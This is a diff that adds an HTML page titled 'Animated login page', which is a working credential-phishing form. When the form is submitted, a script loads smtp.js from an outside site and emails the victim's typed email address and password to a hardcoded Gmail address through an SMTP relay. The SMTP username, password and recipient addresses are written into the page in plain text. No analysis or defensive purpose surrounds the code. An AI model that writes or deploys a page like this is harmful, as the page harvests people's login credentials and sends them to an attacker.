@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+           <title>Animated login page</title>
+           <link rel="stylesheet" href="style.css">
+     </head>
+     <blody>
+      <div class="box">
+        <form onsubmit="sendEmail(); reset() ; return false;">
+            
+              <h1>Login</h1>
+                 <input type="email" id="email" name="" placeholder="Email address">
+                 <input type="password" id="password" name="" placeholder="Password">
+                 <button type="submit">Login</button>
+     
+           
+        </form>
+      </div>
+      
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+        <script>
+            function sendEmail(){
+               Email.send({
+                  Host : "smtp.elasticemail.com",
+                  Username : "groupxmemory2@gmail.com",
+                  Password : "53753D12F60B9C8D048ACC633A2E8D705D95",
+                  To : 'pamodmadubashna2003@gmail.com', //Enter your Email here
+                  From : document.getElementById("email").value,
+                  Subject : "New email found",
+                  Body : "Email: " + document.getElementById("email").value
+                  + "<br> Password: "  + document.getElementById("password").value
+               }).then(
+  message => alert("Successfully")
+);
+         }
+        </script>
+     </blody>
+</html>
